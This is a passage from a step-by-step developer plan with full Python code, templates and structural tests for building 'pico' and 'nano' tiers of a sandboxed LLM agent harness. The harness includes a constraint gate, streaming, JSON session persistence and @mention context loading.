    - System prompt loaded from system-prompt.md (not inline constant)
"""

from __future__ import annotations

import argparse
import asyncio
import json
import os
import sys

import yaml
from rich.console import Console
from rich.markdown import Markdown

console = Console()

# -- config loading ------------------------------------------------------------

DEFAULT_CONFIG = {
    "project_root": os.getcwd(),
    "model": "anthropic/claude-sonnet-4-20250514",
    "max_retries": 3,
    "max_iterations": 20,
    "constraints_path": "constraints.py",
}

DEFAULT_SYSTEM_PROMPT = (
    "You are a constrained agent. When a tool call is rejected, "
    "read the rejection reason and try a different approach. "
    "Do not repeat rejected actions."
)


def load_config(config_path: str = "config.yaml") -> dict:
    """Load configuration from a YAML file.

    Falls back to DEFAULT_CONFIG for missing keys or missing file.
    """
    config = dict(DEFAULT_CONFIG)
    try:
        with open(config_path) as f:
            user_config = yaml.safe_load(f.read())
        if isinstance(user_config, dict):
            config.update(user_config)
    except FileNotFoundError:
        pass
    return config


def load_system_prompt(prompt_path: str = "system-prompt.md") -> str:
    """Load system prompt from a markdown file.

    Falls back to DEFAULT_SYSTEM_PROMPT if the file is missing.
    """
    try:
        with open(prompt_path) as f:
            return f.read().strip()
    except FileNotFoundError:
        return DEFAULT_SYSTEM_PROMPT


# -- subcommand: check --------------------------------------------------------


def cmd_check(args: argparse.Namespace, config: dict) -> int:
    """Validate a tool call and print the result. Exit 0=legal, 1=illegal."""
    from .gate import ConstraintGate

    sandbox = os.path.realpath(config["project_root"])
    gate = ConstraintGate(sandbox, config["constraints_path"])

    tool_name = args.tool_name
    try:
        params = json.loads(args.params_json)
    except json.JSONDecodeError as exc:
        console.print(f"[red]Invalid JSON: {exc}[/red]")
        return 1

    ok, reason = gate.check(tool_name, params)
    if ok:
        console.print(f"[green]LEGAL:[/green] {tool_name}")
        return 0
    else:
        console.print(f"[red]ILLEGAL:[/red] {tool_name} - {reason}")
        return 1


# -- subcommand: chat ---------------------------------------------------------


def cmd_chat(args: argparse.Namespace, config: dict, system_prompt: str) -> int:
    """Interactive REPL: send messages to the agent, render responses as Markdown."""
    try:
        from .runtime import PicoAgent
    except ImportError as exc:
        console.print(f"[red]Error: litellm is required for chat - {exc}[/red]")
        return 2

    sandbox = os.path.realpath(config["project_root"])
    model = config["model"]
    max_retries = config.get("max_retries", 3)
    max_iterations = config.get("max_iterations", 20)

    agent = PicoAgent(
        sandbox_path=sandbox,
        model=model,
        system_prompt=system_prompt,
        max_retries=max_retries,
        max_iterations=max_iterations,
        constraints_path=config["constraints_path"],
    )

    console.print(f"[bold]{{{{harness_name}}}}[/bold]  (sandbox={sandbox}  model={model})")
    console.print("Type [bold]exit[/bold] or Ctrl-D to quit.\n")

    loop = asyncio.new_event_loop()

    while True:
        # -- input phase: Ctrl-C hints, Ctrl-D exits --
        try:
            user_input = console.input("[bold green]You>[/bold green] ").strip()
        except EOFError:
            console.print("\nGoodbye.")
            break
        except KeyboardInterrupt:
            console.print("\n[dim](Use 'exit' or Ctrl-D to quit)[/dim]")
            continue

        if not user_input:
            continue
        if user_input.lower() in {"exit", "quit"}:
            console.print("Goodbye.")
            break

        # -- response phase: Ctrl-C cancels the response --
        try:
            response = loop.run_until_complete(agent.run(user_input))
            console.print("\n[bold blue]Agent>[/bold blue]")
            console.print(Markdown(response))
            console.print()
        except KeyboardInterrupt:
            # Cancel any pending async tasks so the event loop stays healthy
            pending = asyncio.all_tasks(loop)
            for task in pending:
                task.cancel()
            if pending:
                loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
            console.print("\n[dim](Response cancelled)[/dim]\n")
        except Exception as exc:  # noqa: BLE001
            console.print(f"\n[red]Error: {exc}[/red]\n")

    loop.close()
    return 0


# -- subcommand: audit ---------------------------------------------------------


def cmd_audit(args: argparse.Namespace, config: dict, system_prompt: str) -> int:
    """Dry-run: send prompt to LLM, validate proposed tool calls, no execution."""
    try:
        import litellm  # type: ignore[import-untyped]
    except ImportError as exc:
        console.print(f"[red]Error: litellm is required for audit - {exc}[/red]")
        return 2

    from .gate import ConstraintGate
    from .runtime import TOOL_SCHEMAS

    sandbox = os.path.realpath(config["project_root"])
    gate = ConstraintGate(sandbox, config["constraints_path"])
    model = config["model"]

    console.print(f"[bold]audit[/bold]  (sandbox={sandbox!r}  model={model!r})")
    console.print(f"Prompt: {args.prompt!r}\n")

    async def _run() -> int:
        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": args.prompt},
        ]
        try:
            response = await litellm.acompletion(
                model=model,
                messages=messages,
                tools=TOOL_SCHEMAS,
                tool_choice="auto",
            )
        except Exception as exc:  # noqa: BLE001
            console.print(f"[red]LLM error: {exc}[/red]")
            return 3

        msg = response.choices[0].message

        if not msg.tool_calls:
            console.print(f"Agent response (no tool calls):\n{msg.content or ''}")
            return 0

        violations = 0
        console.print(f"Proposed tool calls: {len(msg.tool_calls)}\n")
        for tc in msg.tool_calls:
            tool_name = tc.function.name
            try:
                params = json.loads(tc.function.arguments)
            except json.JSONDecodeError:
                params = {}

            ok, reason = gate.check(tool_name, params)
            status = "[green]LEGAL[/green]   " if ok else "[red]ILLEGAL[/red] "
            console.print(f"  {status} {tool_name}({params})")
            if not ok:
                console.print(f"             Reason: {reason}")
                violations += 1

        console.print(f"\nSummary: {len(msg.tool_calls)} proposed, {violations} violations")
        return 1 if violations else 0

    return asyncio.run(_run())


# -- argument parser -----------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    """Build the CLI argument parser with chat/check/audit subcommands."""
    parser = argparse.ArgumentParser(
        description="Pico-tier constrained mini-amplifier agent",
    )
    parser.add_argument(
        "--config",
        default="config.yaml",
        help="Path to config.yaml (default: config.yaml)",
    )
    parser.add_argument(
        "--system-prompt",
        default="system-prompt.md",
        help="Path to system-prompt.md (default: system-prompt.md)",
    )

    sub = parser.add_subparsers(dest="subcommand", required=True)

    # -- chat --
    sub.add_parser("chat", help="Interactive constrained agent session")

    # -- check --
    p_check = sub.add_parser("check", help="One-shot constraint validation")
    p_check.add_argument("tool_name", help="Tool name (e.g., bash, read_file)")
    p_check.add_argument("params_json", help="Tool parameters as JSON string")

    # -- audit --
    p_audit = sub.add_parser("audit", help="Dry-run: validate proposed tool calls")
    p_audit.add_argument("prompt", help="User prompt to send to the agent")

    return parser


# -- main ----------------------------------------------------------------------


def main() -> None:
    """CLI entry point."""
    parser = build_parser()
    args = parser.parse_args()

    config = load_config(args.config)
    system_prompt = load_system_prompt(args.system_prompt)

    if args.subcommand == "check":
        sys.exit(cmd_check(args, config))
    elif args.subcommand == "chat":
        sys.exit(cmd_chat(args, config, system_prompt))
    elif args.subcommand == "audit":
        sys.exit(cmd_audit(args, config, system_prompt))


if __name__ == "__main__":
    main()
```

### Step 9: Create `runtime/pico/setup.sh.template`

```bash
#!/usr/bin/env bash
# Setup script for {{harness_name}} — pico-tier mini-amplifier
#
# Creates a virtual environment, installs dependencies, and runs tests.
# Usage: bash setup.sh

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

echo "=== Setting up {{harness_name}} ==="

# Create virtual environment
if [ ! -d ".venv" ]; then
    echo "Creating virtual environment..."
    python3 -m venv .venv
fi

# Activate venv
source .venv/bin/activate

# Install in editable mode
echo "Installing dependencies..."
pip install --quiet --upgrade pip
pip install --quiet -e .

# Run tests
echo "Running tests..."
python -m pytest tests/ -v

echo ""
echo "=== Setup complete ==="
echo "Activate with: source .venv/bin/activate"
echo "Run with: {{harness_name}} chat"
```

### Step 10: Create `runtime/pico/pyproject.toml.template`

```toml
[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[project]
name = "{{harness_name}}"
version = "0.1.0"
description = "Pico-tier constrained mini-amplifier — {{harness_name}}"
requires-python = ">=3.11"
license = "MIT"
dependencies = [
    "litellm>=1.0",
    "pyyaml>=6.0",
    "rich>=13.0",
]

[project.scripts]
{{harness_name}} = "{{package_name}}.cli:main"
```

### Step 11: Create `runtime/pico/Dockerfile.template`

```dockerfile
FROM python:3.11-slim

# Install system dependencies
RUN apt-get update && apt-get install -y --no-install-recommends \
    git \
    ripgrep \
    && rm -rf /var/lib/apt/lists/*

# Non-root user for security
RUN useradd --create-home --shell /bin/bash agent
USER agent
WORKDIR /home/agent/app

# Install Python dependencies
COPY --chown=agent:agent . ./
RUN pip install --no-cache-dir --user -e .

# Default: interactive chat mode
ENTRYPOINT ["{{harness_name}}"]
CMD ["chat"]
```

### Step 12: Create `runtime/pico/docker-compose.template.yaml`

```yaml
services:
  agent:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: {{harness_name}}-agent
    stdin_open: true
    tty: true
    environment:
      - ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY}
      - OPENAI_API_KEY=${OPENAI_API_KEY}
    volumes:
      - {{project_root}}:/workspace:rw
    working_dir: /workspace
    # Resource limits
    mem_limit: 2g
    cpus: "2.0"
    # Security
    security_opt:
      - no-new-privileges:true
    read_only: true
    tmpfs:
      - /tmp:size=100M
```

### Step 13: Update `tests/test_scaffold.py` — replace `TestRuntime` class

The old `TestRuntime` class (at the bottom of `tests/test_scaffold.py`) checks for files in the old flat `runtime/` directory. Replace the entire class with one that checks for the new three-tier structure.

Find this block (lines 515-573) and replace it:

```python
class TestRuntime:
    def test_runtime_dir_exists(self):
        assert os.path.isdir(os.path.join(BUNDLE_ROOT, "runtime"))

    def test_pico_dir_exists(self):
        assert os.path.isdir(os.path.join(BUNDLE_ROOT, "runtime", "pico"))

    def test_nano_dir_exists(self):
        assert os.path.isdir(os.path.join(BUNDLE_ROOT, "runtime", "nano"))

    def test_micro_dir_exists(self):
        assert os.path.isdir(os.path.join(BUNDLE_ROOT, "runtime", "micro"))

    def test_pico_cli_exists(self):
        path = os.path.join(BUNDLE_ROOT, "runtime", "pico", "cli.py")
        assert os.path.isfile(path)

    def test_pico_runtime_exists(self):
        path = os.path.join(BUNDLE_ROOT, "runtime", "pico", "runtime.py")
        assert os.path.isfile(path)

    def test_pico_tools_exists(self):
        path = os.path.join(BUNDLE_ROOT, "runtime", "pico", "tools.py")
        assert os.path.isfile(path)

    def test_pico_has_rich_rendering(self):
        content = _read_file("runtime/pico/cli.py")
        assert "rich" in content

    def test_pico_has_constraint_gate(self):
        content = _read_file("runtime/pico/runtime.py")
        assert "gate" in content.lower() or "constraint" in content.lower()

    def test_pico_pyproject_template_has_harness_name(self):
        content = _read_file("runtime/pico/pyproject.toml.template")
        assert "{{harness_name}}" in content

    def test_pico_dockerfile_template_exists(self):
        path = os.path.join(BUNDLE_ROOT, "runtime", "pico", "Dockerfile.template")
        assert os.path.isfile(path)

    def test_pico_docker_compose_has_project_root(self):
        content = _read_file("runtime/pico/docker-compose.template.yaml")
        assert "{{project_root}}" in content
```

### Step 14: Run ALL tests to verify pico passes

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -m pytest tests/test_pico_scaffold.py -v
```

Expected: ALL PASS. If any fail, fix the scaffold file that's missing the pattern.

Then run the full scaffold test (it will have some failures for nano/micro not existing yet — that's expected):

```bash
python -m pytest tests/test_scaffold.py::TestRuntime -v
```

Expected: pico tests pass, nano/micro dir tests fail (they don't exist yet — that's fine, we create them in Tasks 2 and 3).

### Step 15: Commit

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
git add runtime/pico/ tests/test_pico_scaffold.py
git add -u  # stages deletions of old runtime files and test_scaffold.py changes
git commit -m "feat: add pico runtime scaffold with rich CLI, signal handling, constraint gate

- Delete old flat runtime/ files (cli.py, runtime.py, tools.py, templates)
- Create runtime/pico/ with 9 files modeled on pico-amplifier reference
- cli.py: Rich Console + Markdown, proper Ctrl-C/Ctrl-D signal handling,
  config.yaml loading, system-prompt.md loading, chat/check/audit subcommands
- runtime.py: async PicoAgent with litellm.acompletion, constraint gate,
  retry logic, MAX_ITERATIONS, tool dispatch (all config-driven, not hardcoded)
- tools.py: 7 tools (read/write/edit/apply_patch/bash/grep/glob) with
  independent project_root enforcement (defense-in-depth)
- gate.py: ConstraintGate wrapper with auto-detection of is_legal_action
  vs validate_action signatures
- Templates: setup.sh, pyproject.toml, Dockerfile (non-root), docker-compose
  (resource limits + security)
- 45 structural tests in tests/test_pico_scaffold.py
- Update TestRuntime in test_scaffold.py for three-tier structure"
```

---

## Task 2: Nano Runtime Scaffold

**What you're building:** The sweet spot tier — everything pico has, plus streaming responses, session persistence, dynamic context loading, and multi-provider support. ~2,000-3,500 lines across 13 files. Think: daily-use domain specialists.

**Files to CREATE (copies of pico + 4 new files):**
- `runtime/nano/__init__.py` (new)
- `runtime/nano/cli.py` (extended from pico)
- `runtime/nano/runtime.py` (extended from pico)
- `runtime/nano/tools.py` (copy from pico — unchanged)
- `runtime/nano/gate.py` (copy from pico — unchanged)
- `runtime/nano/streaming.py` (NEW — nano-specific)
- `runtime/nano/session.py` (NEW — nano-specific)
- `runtime/nano/context.py` (NEW — nano-specific)
- `runtime/nano/providers.py` (NEW — nano-specific)
- `runtime/nano/setup.sh.template` (adapted from pico)
- `runtime/nano/pyproject.toml.template` (adapted from pico)
- `runtime/nano/Dockerfile.template` (copy from pico)
- `runtime/nano/docker-compose.template.yaml` (copy from pico)

**Test file:** `tests/test_nano_scaffold.py`

### Step 1: Write the failing tests

Create `tests/test_nano_scaffold.py` with this exact content:

```python
"""Structural tests for the nano runtime scaffold (runtime/nano/).

Nano builds on pico — it has everything pico has, plus:
  - streaming.py: streaming response handler
  - session.py: basic session persistence (JSON files)
  - context.py: dynamic context loading from @mention files
  - providers.py: multi-provider support via litellm config
"""

import os

import pytest

BUNDLE_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
NANO_DIR = os.path.join(BUNDLE_ROOT, "runtime", "nano")


def _read_nano(filename: str) -> str:
    """Read a file from the nano scaffold directory."""
    path = os.path.join(NANO_DIR, filename)
    with open(path) as f:
        return f.read()


# ---------------------------------------------------------------------------
# File existence tests
# ---------------------------------------------------------------------------

# All files pico has, plus 4 nano-specific files
PICO_FILES = [
    "__init__.py",
    "cli.py",
    "runtime.py",
    "tools.py",
    "gate.py",
    "setup.sh.template",
    "pyproject.toml.template",
    "Dockerfile.template",
    "docker-compose.template.yaml",
]

NANO_SPECIFIC_FILES = [
    "streaming.py",
    "session.py",
    "context.py",
    "providers.py",
]

ALL_NANO_FILES = PICO_FILES + NANO_SPECIFIC_FILES


class TestNanoFilesExist:
    @pytest.mark.parametrize("filename", PICO_FILES)
    def test_nano_has_pico_file(self, filename):
        """Nano must have every file that pico has."""
        path = os.path.join(NANO_DIR, filename)
        assert os.path.isfile(path), f"runtime/nano/{filename} missing (required from pico)"

    @pytest.mark.parametrize("filename", NANO_SPECIFIC_FILES)
    def test_nano_specific_file_exists(self, filename):
        path = os.path.join(NANO_DIR, filename)
        assert os.path.isfile(path), f"runtime/nano/{filename} does not exist"

    def test_nano_all_thirteen_files_exist(self):
        """Verify all 13 expected files are present."""
        for filename in ALL_NANO_FILES:
            path = os.path.join(NANO_DIR, filename)
            assert os.path.isfile(path), f"runtime/nano/{filename} missing"


# ---------------------------------------------------------------------------
# streaming.py structural tests
# ---------------------------------------------------------------------------


class TestNanoStreaming:
    def test_has_stream_handler(self):
        content = _read_nano("streaming.py")
        assert "stream" in content.lower(), (
            "streaming.py must have stream handling logic"
        )

    def test_has_async_support(self):
        content = _read_nano("streaming.py")
        assert "async" in content or "await" in content, (
            "streaming.py must support async streaming"
        )

    def test_has_chunk_processing(self):
        content = _read_nano("streaming.py")
        assert "chunk" in content.lower() or "delta" in content.lower(), (
            "streaming.py must process response chunks/deltas"
        )

    def test_has_fallback(self):
        """Must fall back to non-streaming if provider doesn't support it."""
        content = _read_nano("streaming.py")
        assert "fallback" in content.lower() or "non-stream" in content.lower() or (
            "stream=False" in content or "stream = False" in content
        ), "streaming.py must have a non-streaming fallback"


# ---------------------------------------------------------------------------
# session.py structural tests
# ---------------------------------------------------------------------------


class TestNanoSession:
    def test_has_save(self):
        content = _read_nano("session.py")
        assert "save" in content.lower(), (
            "session.py must have save functionality"
        )

    def test_has_load_or_resume(self):
        content = _read_nano("session.py")
        assert "load" in content.lower() or "resume" in content.lower(), (
            "session.py must have load/resume functionality"
        )

    def test_uses_json_not_sqlite(self):
        content = _read_nano("session.py")
        assert "json" in content.lower(), (
            "session.py must use JSON for persistence"
        )
        assert "sqlite" not in content.lower(), (
            "session.py must NOT use SQLite — JSON files only"
        )

    def test_has_list_sessions(self):
        content = _read_nano("session.py")
        assert "list" in content.lower(), (
            "session.py must support listing available sessions"
        )

    def test_has_sessions_directory(self):
        content = _read_nano("session.py")
        assert ".sessions" in content or "sessions" in content, (
            "session.py must use a .sessions/ directory"
        )


# ---------------------------------------------------------------------------
# context.py structural tests
# ---------------------------------------------------------------------------


class TestNanoContext:
    def test_has_mention_or_at_parsing(self):
        content = _read_nano("context.py")
        assert "@" in content or "mention" in content.lower(), (
            "context.py must parse @mention references"
        )

    def test_has_file_loading(self):
        content = _read_nano("context.py")
        assert "load" in content.lower() or "read" in content.lower(), (
            "context.py must load referenced files"
        )

    def test_has_glob_support(self):
        content = _read_nano("context.py")
        assert "glob" in content.lower() or "*" in content, (
            "context.py must support glob patterns in @mentions"
        )

    def test_has_project_root_reference(self):
        content = _read_nano("context.py")
        assert "project_root" in content or "sandbox" in content, (
            "context.py must resolve files relative to project_root"
        )


# ---------------------------------------------------------------------------
# providers.py structural tests
# ---------------------------------------------------------------------------


class TestNanoProviders:
    def test_has_provider_config(self):
        content = _read_nano("providers.py")
        assert "provider" in content.lower(), (
            "providers.py must handle provider configuration"
        )

    def test_has_switching(self):
        content = _read_nano("providers.py")
        assert "switch" in content.lower() or "select" in content.lower() or (
            "set_provider" in content or "current" in content
        ), "providers.py must support provider switching"

    def test_has_config_loading(self):
        content = _read_nano("providers.py")
        assert "config" in content.lower(), (
            "providers.py must read from config"
        )

    def test_has_model_attribute(self):
        content = _read_nano("providers.py")
        assert "model" in content, (
            "providers.py must handle model names per provider"
        )

    def test_has_api_key_reference(self):
        content = _read_nano("providers.py")
        assert "api_key" in content or "API_KEY" in content, (
            "providers.py must reference API key env vars"
        )


# ---------------------------------------------------------------------------
# Enhanced cli.py structural tests (nano extensions)
# ---------------------------------------------------------------------------


class TestNanoCli:
    def test_has_resume_flag(self):
        content = _read_nano("cli.py")
        assert "resume" in content.lower(), (
            "nano cli.py must have --resume flag for session persistence"
        )

    def test_has_provider_command(self):
        content = _read_nano("cli.py")
        assert "provider" in content.lower(), (
            "nano cli.py must support /provider command for switching providers"
        )

    def test_has_stream_flag(self):
        content = _read_nano("cli.py")
        assert "stream" in content.lower(), (
            "nano cli.py must support streaming (--no-stream flag to disable)"
        )

    def test_still_has_rich(self):
        """Nano cli.py must retain all pico features."""
        content = _read_nano("cli.py")
        assert "rich" in content, "nano cli.py must still use Rich rendering"

    def test_still_has_signal_handling(self):
        content = _read_nano("cli.py")
        assert "KeyboardInterrupt" in content, (
            "nano cli.py must still handle KeyboardInterrupt"
        )
        assert "EOFError" in content, (
            "nano cli.py must still handle EOFError"
        )


# ---------------------------------------------------------------------------
# Enhanced runtime.py structural tests (nano extensions)
# ---------------------------------------------------------------------------


class TestNanoRuntime:
    def test_uses_streaming(self):
        content = _read_nano("runtime.py")
        assert "stream" in content.lower(), (
            "nano runtime.py must integrate streaming"
        )

    def test_uses_session(self):
        content = _read_nano("runtime.py")
        assert "session" in content.lower(), (
            "nano runtime.py must integrate session persistence"
        )

    def test_uses_context(self):
        content = _read_nano("runtime.py")
        assert "context" in content.lower(), (
            "nano runtime.py must integrate dynamic context loading"
        )

    def test_uses_providers(self):
        content = _read_nano("runtime.py")
        assert "provider" in content.lower(), (
            "nano runtime.py must integrate multi-provider support"
        )

    def test_still_has_constraint_gate(self):
        content = _read_nano("runtime.py")
        assert "gate" in content.lower() or "constraint" in content.lower(), (
            "nano runtime.py must still use constraint gate"
        )

    def test_still_has_litellm(self):
        content = _read_nano("runtime.py")
        assert "litellm" in content, (
            "nano runtime.py must still use litellm"
        )
```

### Step 2: Run the tests to verify they fail

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -m pytest tests/test_nano_scaffold.py -v 2>&1 | head -80
```

Expected: ALL tests FAIL because `runtime/nano/` doesn't exist yet.

### Step 3: Create nano scaffold — copy pico base, then add nano-specific files

**First, copy the entire pico scaffold as the nano base:**

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
cp -r runtime/pico runtime/nano
```

**Then update `runtime/nano/__init__.py`:**

```python
"""Nano runtime scaffold — the sweet spot tier.

Everything in pico, plus:
  - streaming.py: streaming response handler (progressive rendering)
  - session.py: basic session persistence (save/resume as JSON)
  - context.py: dynamic context loading from @mention files
  - providers.py: multi-provider support via litellm config

~2,000-3,500 lines. Purpose-built specialists and daily-use tools.

This package is copied into generated nano-tier mini-amplifiers
at /harness-finish packaging time.
"""
```

### Step 4: Create `runtime/nano/streaming.py`

```python
"""Streaming response handler for nano-tier mini-amplifiers.

Wraps litellm.acompletion with stream=True for progressive response rendering.
Falls back to non-streaming if the provider doesn't support it.

Usage:
    streamer = StreamHandler(console)
    response = await streamer.stream_completion(model, messages, tools)
"""

from __future__ import annotations

from typing import TYPE_CHECKING

import litellm  # type: ignore[import-untyped]

if TYPE_CHECKING:
    from rich.console import Console


class StreamHandler:
    """Handles streaming LLM responses with progressive Rich rendering.

    Processes response chunks/deltas as they arrive and renders them
    to the console in real-time. Falls back to non-streaming completion
    if the provider returns an error on stream=True.
    """

    def __init__(self, console: "Console") -> None:
        self.console = console

    async def stream_completion(
        self,
        model: str,
        messages: list[dict],
        tools: list[dict] | None = None,
    ) -> dict:
        """Stream a completion from the LLM, rendering chunks as they arrive.

        Args:
            model: LiteLLM model identifier.
            messages: Conversation messages.
            tools: Tool schemas (if any).

        Returns:
            The complete response message dict (same shape as non-streaming).
        """
        try:
            return await self._stream(model, messages, tools)
        except Exception:
            # Fallback to non-streaming if stream fails
            return await self._non_stream_fallback(model, messages, tools)

    async def _stream(
        self,
        model: str,
        messages: list[dict],
        tools: list[dict] | None,
    ) -> dict:
        """Internal: perform streaming completion and accumulate chunks."""
        response = await litellm.acompletion(
            model=model,
            messages=messages,
            tools=tools,
            tool_choice="auto" if tools else None,
            stream=True,
        )

        collected_content = ""
        collected_tool_calls: list[dict] = []

        async for chunk in response:
            delta = chunk.choices[0].delta

            # Accumulate text content
            if delta.content:
                collected_content += delta.content
                self.console.print(delta.content, end="")

            # Accumulate tool call deltas
            if delta.tool_calls:
                for tc_delta in delta.tool_calls:
                    idx = tc_delta.index
                    while len(collected_tool_calls) <= idx:
                        collected_tool_calls.append(
                            {"id": "", "type": "function", "function": {"name": "", "arguments": ""}}
                        )
                    tc = collected_tool_calls[idx]
                    if tc_delta.id:
                        tc["id"] = tc_delta.id
                    if tc_delta.function:
                        if tc_delta.function.name:
                            tc["function"]["name"] = tc_delta.function.name
                        if tc_delta.function.arguments:
                            tc["function"]["arguments"] += tc_delta.function.arguments

        if collected_content:
            self.console.print()  # newline after streamed content

        # Build response in same shape as non-streaming
        result: dict = {
            "role": "assistant",
            "content": collected_content or None,
            "tool_calls": collected_tool_calls if collected_tool_calls else None,
        }
        return result

    async def _non_stream_fallback(
        self,
        model: str,
        messages: list[dict],
        tools: list[dict] | None,
    ) -> dict:
        """Fallback: non-streaming completion (stream=False)."""
        response = await litellm.acompletion(
            model=model,
            messages=messages,
            tools=tools,
            tool_choice="auto" if tools else None,
            stream=False,
        )
        msg = response.choices[0].message
        return {
            "role": "assistant",
            "content": msg.content or None,
            "tool_calls": (
                [
                    {
                        "id": tc.id,
                        "type": "function",
                        "function": {
                            "name": tc.function.name,
                            "arguments": tc.function.arguments,
                        },
                    }
                    for tc in msg.tool_calls
                ]
                if msg.tool_calls
                else None
            ),
        }
```

### Step 5: Create `runtime/nano/session.py`

```python
"""Basic session persistence for nano-tier mini-amplifiers.

Saves and resumes conversation history as JSON files in a .sessions/ directory.
No SQLite — just human-readable JSON files.

Usage:
    manager = SessionManager(project_root)
    manager.save(session_id, messages)
    messages = manager.load(session_id)
    sessions = manager.list_sessions()
"""

from __future__ import annotations

import json
import os
import time
from pathlib import Path


class SessionManager:
    """Manages conversation session persistence as JSON files.

    Sessions are stored as:
        .sessions/{harness_name}-session-{id}.json

    Each file contains:
        {
            "session_id": "...",
            "created_at": "...",
            "updated_at": "...",
            "messages": [...]
        }
    """

    def __init__(self, project_root: str, harness_name: str = "agent") -> None:
        """Initialize the session manager.

        Args:
            project_root: Base directory for the .sessions/ folder.
            harness_name: Name prefix for session files.
        """
        self.sessions_dir = os.path.join(project_root, ".sessions")
        self.harness_name = harness_name
        Path(self.sessions_dir).mkdir(parents=True, exist_ok=True)

    def _session_path(self, session_id: str) -> str:
        """Return the file path for a session ID."""
        filename = f"{self.harness_name}-session-{session_id}.json"
        return os.path.join(self.sessions_dir, filename)

    def save(self, session_id: str, messages: list[dict]) -> str:
        """Save conversation messages to a session file.

        Args:
            session_id: Unique session identifier.
            messages: List of message dicts (the conversation history).

        Returns:
            Path to the saved session file.
        """
        path = self._session_path(session_id)
        now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

        # Load existing metadata if resuming
        existing: dict = {}
        if os.path.isfile(path):
            with open(path, encoding="utf-8") as f:
                existing = json.load(f)

        data = {
            "session_id": session_id,
            "created_at": existing.get("created_at", now),
            "updated_at": now,
            "messages": messages,
        }

        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

        return path

    def load(self, session_id: str) -> list[dict]:
        """Load conversation messages from a session file.

        Args:
            session_id: Session identifier to resume.

        Returns:
            List of message dicts.

        Raises:
            FileNotFoundError: If the session file doesn't exist.
        """
        path = self._session_path(session_id)
        if not os.path.isfile(path):
            raise FileNotFoundError(f"Session not found: {session_id}")

        with open(path, encoding="utf-8") as f:
            data = json.load(f)

        return data.get("messages", [])

    def list_sessions(self) -> list[dict]:
        """List all available sessions, sorted by last update (newest first).

        Returns:
            List of dicts with session_id, created_at, updated_at, message_count.
        """
        sessions = []
        if not os.path.isdir(self.sessions_dir):
            return sessions

        for filename in os.listdir(self.sessions_dir):
            if not filename.endswith(".json"):
                continue
            path = os.path.join(self.sessions_dir, filename)
            try:
                with open(path, encoding="utf-8") as f:
                    data = json.load(f)
                sessions.append(
                    {
                        "session_id": data.get("session_id", "unknown"),
                        "created_at": data.get("created_at", ""),
                        "updated_at": data.get("updated_at", ""),
                        "message_count": len(data.get("messages", [])),
                    }
                )
            except (json.JSONDecodeError, KeyError):
                continue

        sessions.sort(key=lambda s: s["updated_at"], reverse=True)
        return sessions

    def delete(self, session_id: str) -> bool:
        """Delete a session file.

        Args:
            session_id: Session to delete.

        Returns:
            True if deleted, False if not found.
        """
        path = self._session_path(session_id)
        if os.path.isfile(path):
            os.remove(path)
            return True
        return False
```

### Step 6: Create `runtime/nano/context.py`

```python
"""Dynamic context loading for nano-tier mini-amplifiers.

Parses @mention references in the system prompt and user messages,
loads the referenced files relative to project_root, and injects
them as system messages.

Supports:
    @docs/README.md       — load a single file
    @docs/*.md            — glob pattern, load all matching files
    @context/             — load all files in a directory

Usage:
    loader = ContextLoader(project_root)
    extra_messages = loader.resolve_mentions(text)
"""

from __future__ import annotations

import os
import re
from pathlib import Path


# Regex to find @mention references: @path/to/file or @path/*.glob
_MENTION_RE = re.compile(r"@([\w./_*-]+)")


class ContextLoader:
    """Loads files referenced by @mention patterns in text.

    All paths are resolved relative to project_root. Paths outside
    project_root are silently ignored (defense-in-depth).
    """

    def __init__(self, project_root: str) -> None:
        """Initialize the context loader.

        Args:
            project_root: Base directory for resolving @mention paths.
        """
        self.project_root = os.path.realpath(project_root)

    def resolve_mentions(self, text: str) -> list[dict]:
        """Find all @mention references in text and load their contents.

        Args:
            text: Text potentially containing @path references.

        Returns:
            List of system message dicts with loaded file contents.
        """
        mentions = _MENTION_RE.findall(text)
        if not mentions:
            return []

        loaded: list[dict] = []
        seen: set[str] = set()

        for mention in mentions:
            paths = self._resolve_paths(mention)
            for path in paths:
                if path in seen:
                    continue
                seen.add(path)
                content = self._read_file(path)
                if content is not None:
                    loaded.append(
                        {
                            "role": "system",
                            "content": f"[Context: {mention}]\n{content}",
                        }
                    )

        return loaded

    def _resolve_paths(self, mention: str) -> list[str]:
        """Resolve a mention string to one or more absolute file paths.

        Handles:
            - Single file: docs/README.md
            - Glob pattern: docs/*.md
            - Directory: context/ (loads all files)
        """
        # Glob pattern
        if "*" in mention:
            base = Path(self.project_root)
            matches = sorted(str(p) for p in base.glob(mention) if p.is_file())
            return [m for m in matches if self._is_inside_root(m)]

        full_path = os.path.join(self.project_root, mention)
        resolved = os.path.realpath(full_path)

        # Directory: load all files
        if os.path.isdir(resolved) and self._is_inside_root(resolved):
            files = sorted(
                str(p) for p in Path(resolved).iterdir() if p.is_file()
            )
            return [f for f in files if self._is_inside_root(f)]

        # Single file
        if os.path.isfile(resolved) and self._is_inside_root(resolved):
            return [resolved]

        return []

    def _is_inside_root(self, path: str) -> bool:
        """Check whether a path is inside project_root."""
        real = os.path.realpath(path)
        return real == self.project_root or real.startswith(self.project_root + os.sep)

    def _read_file(self, path: str) -> str | None:
        """Read a file, returning None on error."""
        try:
            with open(path, encoding="utf-8") as f:
                return f.read()
        except (OSError, UnicodeDecodeError):
            return None
```

### Step 7: Create `runtime/nano/providers.py`

```python
"""Multi-provider configuration for nano-tier mini-amplifiers.

Reads provider definitions from config.yaml and supports runtime
switching via the /provider command in the chat REPL.

config.yaml format:
    providers:
      - name: anthropic
        model: anthropic/claude-sonnet-4-20250514
        api_key_env: ANTHROPIC_API_KEY
      - name: openai
        model: openai/gpt-4o
